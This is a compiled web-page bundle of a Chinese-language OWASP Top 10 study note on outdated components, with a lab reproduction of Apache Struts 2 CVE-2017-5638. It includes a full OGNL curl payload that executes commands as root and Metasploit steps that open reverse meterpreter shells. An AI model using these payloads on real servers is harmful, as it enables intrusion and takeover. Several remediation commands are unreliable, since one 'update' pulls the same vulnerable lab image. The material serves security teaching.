"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[9422],{95888:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>h,frontMatter:()=>l,metadata:()=>c,toc:()=>o});var r=s(74848),t=s(28453);const l={},i="A06: \u6613\u53d7\u653b\u64ca\u7684\u5143\u4ef6\uff08Vulnerable and Outdated Components\uff09",c={id:"notes/owasp-top10-2021/vulnerable-and-outdated-components",title:"A06: \u6613\u53d7\u653b\u64ca\u7684\u5143\u4ef6\uff08Vulnerable and Outdated Components\uff09",description:"\u6f0f\u6d1e\u6982\u8ff0",source:"@site/docs/notes/owasp-top10-2021/11-vulnerable-and-outdated-components.mdx",sourceDirName:"notes/owasp-top10-2021",slug:"/notes/owasp-top10-2021/vulnerable-and-outdated-components",permalink:"/docs/notes/owasp-top10-2021/vulnerable-and-outdated-components",draft:!1,unlisted:!1,tags:[],version:"current",sidebarPosition:11,frontMatter:{},sidebar:"notesSidebar",previous:{title:"A05: \u5b89\u5168\u8a2d\u5b9a\u932f\u8aa4\uff08Security Misconfiguration\uff09",permalink:"/docs/notes/owasp-top10-2021/security-misconfiguration"},next:{title:"A07: \u8eab\u5206\u9a57\u8b49\u8207\u6388\u6b0a\u5931\u6557\uff08Identification and Authentication Failures\uff09",permalink:"/docs/notes/owasp-top10-2021/identification-and-authentication-failures copy"}},d={},o=[{value:"\u6f0f\u6d1e\u6982\u8ff0",id:"\u6f0f\u6d1e\u6982\u8ff0",level:2},{value:"\u6f0f\u6d1e\u5f71\u97ff",id:"\u6f0f\u6d1e\u5f71\u97ff",level:2},{value:"\u5fa9\u73fe\u6f0f\u6d1e\uff08Apache Struts 2 - CVE-2017-5638\uff09",id:"\u5fa9\u73fe\u6f0f\u6d1eapache-struts-2---cve-2017-5638",level:2},{value:"\u274c \u74b0\u5883\u6e96\u5099",id:"-\u74b0\u5883\u6e96\u5099",level:3},{value:"\u274c \u653b\u64ca\u6b65\u9a5f",id:"-\u653b\u64ca\u6b65\u9a5f",level:3},{value:"\ud83d\udd0d \u6f0f\u6d1e\u6aa2\u6e2c",id:"-\u6f0f\u6d1e\u6aa2\u6e2c",level:3},{value:"\u4fee\u88dc\u65b9\u5f0f",id:"\u4fee\u88dc\u65b9\u5f0f",level:2},{value:"\u2705 1. \u7acb\u5373\u5347\u7d1a\u53d7\u5f71\u97ff\u7684\u5143\u4ef6",id:"-1-\u7acb\u5373\u5347\u7d1a\u53d7\u5f71\u97ff\u7684\u5143\u4ef6",level:3},{value:"\u2705 2. \u555f\u7528\u81ea\u52d5\u66f4\u65b0",id:"-2-\u555f\u7528\u81ea\u52d5\u66f4\u65b0",level:3},{value:"\u2705 3. \u9650\u5236\u4e0d\u5fc5\u8981\u7684\u6b0a\u9650",id:"-3-\u9650\u5236\u4e0d\u5fc5\u8981\u7684\u6b0a\u9650",level:3}];function a(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"a06-\u6613\u53d7\u653b\u64ca\u7684\u5143\u4ef6vulnerable-and-outdated-components",children:"A06: \u6613\u53d7\u653b\u64ca\u7684\u5143\u4ef6\uff08Vulnerable and Outdated Components\uff09"})}),"\n",(0,r.jsx)(n.h2,{id:"\u6f0f\u6d1e\u6982\u8ff0",children:"\u6f0f\u6d1e\u6982\u8ff0"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u73fe\u4ee3\u61c9\u7528\u7a0b\u5f0f\u958b\u767c\u4e2d\uff0c\u958b\u767c\u8005\u901a\u5e38\u6703\u4f7f\u7528 ",(0,r.jsx)(n.strong,{children:"\u7b2c\u4e09\u65b9\u51fd\u5f0f\u5eab\u3001\u6846\u67b6\u3001\u4f3a\u670d\u5668\u8edf\u9ad4"}),"\uff0c\u4f46\u5982\u679c\u9019\u4e9b\u5143\u4ef6\u672a\u53ca\u6642\u66f4\u65b0\uff0c\u653b\u64ca\u8005\u53ef\u4ee5\u5229\u7528\u5df2\u77e5\u6f0f\u6d1e\u9032\u884c\u653b\u64ca\u3002\u4f8b\u5982\uff1a"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u904e\u6642\u7684 Web \u4f3a\u670d\u5668"}),"\uff08\u5982 Apache\u3001Nginx\u3001Tomcat\uff09\u53ef\u80fd\u5305\u542b RCE\uff08\u9060\u7a0b\u4ee3\u78bc\u57f7\u884c\uff09\u6f0f\u6d1e\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u672a\u66f4\u65b0\u7684\u5f8c\u7aef\u6846\u67b6"}),"\uff08\u5982 Struts\u3001Spring Boot\uff09\u53ef\u80fd\u5141\u8a31\u653b\u64ca\u8005\u7e5e\u904e\u8eab\u4efd\u9a57\u8b49\u6216\u57f7\u884c\u60e1\u610f SQL \u67e5\u8a62\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u524d\u7aef JavaScript \u5957\u4ef6"}),"\uff08\u5982 jQuery\u3001Lodash\uff09\u5982\u679c\u672a\u66f4\u65b0\uff0c\u53ef\u80fd\u6703\u6709 XSS\uff08\u8de8\u7ad9\u8173\u672c\u653b\u64ca\uff09\u6f0f\u6d1e\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"\u6f0f\u6d1e\u5f71\u97ff",children:"\u6f0f\u6d1e\u5f71\u97ff"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u9060\u7aef\u4ee3\u78bc\u57f7\u884c\uff08RCE\uff09"}),"\uff1a\u653b\u64ca\u8005\u53ef\u76f4\u63a5\u5728\u4f3a\u670d\u5668\u4e0a\u57f7\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u4f8b\u5982 ",(0,r.jsx)(n.strong,{children:"Apache Struts 2\uff08CVE-2017-5638\uff09"}),"\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u8eab\u4efd\u9a57\u8b49\u7e5e\u904e"}),"\uff1a\u67d0\u4e9b\u904e\u6642\u7248\u672c\u7684\u8eab\u4efd\u9a57\u8b49\u6a21\u7d44\u53ef\u80fd\u6703\u5141\u8a31\u653b\u64ca\u8005\u7e5e\u904e\u767b\u5165\u9a57\u8b49\uff0c\u4f8b\u5982 ",(0,r.jsx)(n.strong,{children:"Spring Security \u904e\u6642\u7248\u672c"}),"\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u8cc7\u6599\u6d29\u6f0f"}),"\uff1a\u5df2\u77e5\u6f0f\u6d1e\u53ef\u80fd\u5141\u8a31\u653b\u64ca\u8005\u8b80\u53d6\u6216\u4fee\u6539\u8cc7\u6599\uff0c\u4f8b\u5982 ",(0,r.jsx)(n.strong,{children:"\u820a\u7248 OpenSSL \u7684 Heartbleed\uff08CVE-2014-0160\uff09"}),"\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"XSS \u6216 CSRF \u653b\u64ca"}),"\uff1a\u904e\u6642\u7684\u524d\u7aef\u51fd\u5f0f\u5eab\u53ef\u80fd\u5141\u8a31\u653b\u64ca\u8005\u5728\u53d7\u5bb3\u8005\u7684\u700f\u89bd\u5668\u4e2d\u57f7\u884c\u60e1\u610f JavaScript \u4ee3\u78bc\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"\u5fa9\u73fe\u6f0f\u6d1eapache-struts-2---cve-2017-5638",children:"\u5fa9\u73fe\u6f0f\u6d1e\uff08Apache Struts 2 - CVE-2017-5638\uff09"}),"\n",(0,r.jsxs)(n.p,{children:["\u9019\u662f\u4e00\u500b ",(0,r.jsx)(n.strong,{children:"\u975e\u5e38\u77e5\u540d\u7684 RCE\uff08\u9060\u7a0b\u4ee3\u78bc\u57f7\u884c\uff09\u6f0f\u6d1e"}),"\uff0c",(0,r.jsx)(n.a,{href:"https://cwiki.apache.org/confluence/display/WW/S2-045",children:"CVE-2017-5638"}),"\uff0c\u653b\u64ca\u8005\u53ef\u900f\u904e HTTP \u8acb\u6c42\u76f4\u63a5\u57f7\u884c Shell \u547d\u4ee4\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"-\u74b0\u5883\u6e96\u5099",children:"\u274c \u74b0\u5883\u6e96\u5099"}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u4f7f\u7528 ",(0,r.jsx)(n.strong,{children:"Docker"})," \u5feb\u901f\u555f\u52d5 ",(0,r.jsx)(n.strong,{children:"\u53d7\u5f71\u97ff\u7684 Apache Struts 2 \u4f3a\u670d\u5668"}),"\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"docker pull medicean/vulapps:s_struts2_s2-045\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"docker run -d -p 9001:8080 medicean/vulapps:s_struts2_s2-045\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f3a\u670d\u5668\u5c07\u5728 ",(0,r.jsx)(n.code,{children:"http://localhost:9001"})," \u904b\u884c\u3002"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h3,{id:"-\u653b\u64ca\u6b65\u9a5f",children:"\u274c \u653b\u64ca\u6b65\u9a5f"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsxs)(n.strong,{children:["\u78ba\u8a8d\u6f0f\u6d1e\u5b58\u5728\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"curl"})," \u767c\u9001\u60e1\u610f\u8acb\u6c42\uff1a"]})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"curl -H \"User-Agent: Mozilla/5.0\" -H \"Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" http://localhost:9001/memoshow.action?id=3\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u56de\u50b3\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"uid=0(root) gid=0(root) groups=0(root)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u8868\u653b\u64ca\u6210\u529f\uff0c\u5df2\u53d6\u5f97\u4f3a\u670d\u5668\u63a7\u5236\u6b0a\uff01\ud83d\udc80"}),"\n",(0,r.jsxs)(n.ol,{start:"2",children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"\u4f7f\u7528 Metasploit \u9032\u884c\u81ea\u52d5\u5316\u653b\u64ca"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5982\u679c\u4f60\u6709 ",(0,r.jsx)(n.strong,{children:"Metasploit"}),"\uff0c\u53ef\u4ee5\u4f7f\u7528\u73fe\u6210\u7684\u653b\u64ca\u6a21\u7d44\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"msfconsole\nuse exploit/multi/http/struts2_content_type_ognl\nset RHOSTS localhost\nset RPORT 9001\nset TARGETURI /\nexploit\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u56de\u5f97\u5230\u9019\u6a23\u7684\u7d50\u679c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"[*] Exploiting target 127.0.0.1\n[*] Started reverse TCP handler on 172.23.138.63:4444\n[*] Sending stage (3045380 bytes) to 172.23.128.1\n[*] Meterpreter session 1 opened (172.23.138.63:4444 -> 172.23.128.1:62329) at 2025-02-25 20:26:40 +0800\n[*] Session 1 created in the background.\n[*] Exploiting target ::1\n[*] Started reverse TCP handler on 172.23.138.63:4444\n[*] Sending stage (3045380 bytes) to 172.23.128.1\n[*] Meterpreter session 2 opened (172.23.138.63:4444 -> 172.23.128.1:62333) at 2025-02-25 20:26:53 +0800\n[*] Session 2 created in the background.\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u73fe\u5728\u53ef\u4ee5\u57f7\u884c sessions \u6307\u4ee4\u4f86\u67e5\u770b\u958b\u555f\u7684\u6703\u8a71\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"sessions -i\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6703\u5f97\u5230\u53ef\u4ee5\u57f7\u884csessions\u7684\u5217\u8868\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Active sessions\n===============\n\n  Id  Name  Type                   Information        Connection\n  --  ----  ----                   -----------        ----------\n  1         meterpreter x64/linux  root @ 172.17.0.2  172.23.138.63:4444 -> 172.23.128.1:62329 (127.0.0.1)\n  2         meterpreter x64/linux  root @ 172.17.0.2  172.23.138.63:4444 -> 172.23.128.1:62333 (::1)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u9078\u64c7id\u9032\u5165session\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"sessions -i 1\nshell\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u63a5\u8457\u57f7\u884cshell\uff0c\u9019\u6a23\u5c31\u53ef\u4ee5 ",(0,r.jsx)(n.strong,{children:"\u7372\u5f97\u4f3a\u670d\u5668\u7684 Shell"}),"\u3002 \ud83d\udc80"]}),"\n",(0,r.jsx)(n.h3,{id:"-\u6f0f\u6d1e\u6aa2\u6e2c",children:"\ud83d\udd0d \u6f0f\u6d1e\u6aa2\u6e2c"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"OpenVAS"})," \u6703\u9032\u884c\u66f4\u5b8c\u6574\u7684\u6383\u63cf\uff0c\u6aa2\u67e5\u6240\u6709\u904e\u6642\u7684\u5143\u4ef6\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"gvm-scans-result",src:s(57828).A+"",width:"1278",height:"813"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"\u4fee\u88dc\u65b9\u5f0f",children:"\u4fee\u88dc\u65b9\u5f0f"}),"\n",(0,r.jsx)(n.h3,{id:"-1-\u7acb\u5373\u5347\u7d1a\u53d7\u5f71\u97ff\u7684\u5143\u4ef6",children:"\u2705 1. \u7acb\u5373\u5347\u7d1a\u53d7\u5f71\u97ff\u7684\u5143\u4ef6"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Apache Struts"}),"\uff1a\u5c07 ",(0,r.jsx)(n.strong,{children:"Apache Struts"})," \u5347\u7d1a\u81f3 ",(0,r.jsx)(n.strong,{children:"\u6700\u65b0\u7248\u672c"}),"\uff1a"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"sudo apt update && sudo apt upgrade apache-struts\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u524d\u7aef JavaScript \u5957\u4ef6"}),"\uff1a"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"npm audit fix --force\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Java \u5957\u4ef6"}),"\uff1a"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"mvn versions:display-dependency-updates\nmvn versions:update-properties\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h3,{id:"-2-\u555f\u7528\u81ea\u52d5\u66f4\u65b0",children:"\u2705 2. \u555f\u7528\u81ea\u52d5\u66f4\u65b0"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\u5728 ",(0,r.jsx)(n.strong,{children:"Linux \u4f3a\u670d\u5668"})," \u4e0a\u555f\u7528\u81ea\u52d5\u5b89\u5168\u66f4\u65b0\uff1a"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"sudo apt install unattended-upgrades\nsudo dpkg-reconfigure unattended-upgrades\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\u5728 ",(0,r.jsx)(n.strong,{children:"Docker \u74b0\u5883"})," \u4e2d\u78ba\u4fdd\u4f60\u62c9\u53d6\u7684\u6620\u50cf\u6a94\u662f\u6700\u65b0\u7684\uff1a"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"docker pull medicean/vulapps:s2-045\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h3,{id:"-3-\u9650\u5236\u4e0d\u5fc5\u8981\u7684\u6b0a\u9650",children:"\u2705 3. \u9650\u5236\u4e0d\u5fc5\u8981\u7684\u6b0a\u9650"}),"\n",(0,r.jsxs)(n.p,{children:["\u5373\u4f7f\u653b\u64ca\u6210\u529f\uff0c\u4e5f\u61c9\u8a72 ",(0,r.jsx)(n.strong,{children:"\u6700\u5c0f\u5316\u5f71\u97ff\u7bc4\u570d"}),"\uff1a"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u9650\u5236\u4f3a\u670d\u5668\u57f7\u884c\u6b0a\u9650\uff1a"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"sudo usermod -s /usr/sbin/nologin apache\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u7981\u6b62\u61c9\u7528\u7a0b\u5f0f\u9023\u63a5\u5916\u90e8\uff1a"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"iptables -A OUTPUT -p tcp --dport 80 -j DROP\niptables -A OUTPUT -p tcp --dport 443 -j DROP\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(a,{...e})}):a(e)}},57828:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/gvm-scans-result-deabae8e6b278f15681717fbfc894825.png"},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>c});var r=s(96540);const t={},l=r.createContext(t);function i(e){const n=r.useContext(l);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(l.Provider,{value:n},e.children)}}}]);